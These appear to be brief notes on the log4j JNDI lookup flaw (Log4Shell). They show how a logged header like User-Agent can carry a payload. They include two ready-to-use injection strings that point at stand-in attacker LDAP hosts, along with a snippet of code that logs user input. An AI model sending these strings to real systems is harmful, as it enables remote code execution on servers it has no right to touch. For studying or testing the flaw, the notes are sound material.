JNDI uses log4j, you usually can see it in logs

You can insert the JNDI lookup in a header field that is likely to be logged.

*EG** User-Agent: ${jndi:ldap://evil.xo/x}

*attacker controled variable*
public void handle(HttpExchange http) throws IOException 

*Triggers to ender JNDI attackable via log4j*
log.info("Request User Agent {}", userData)

```
${jndi:ldap://attackerserver.com:1289/Exploitpayload}
```

You can look at logs to see if it is reaching out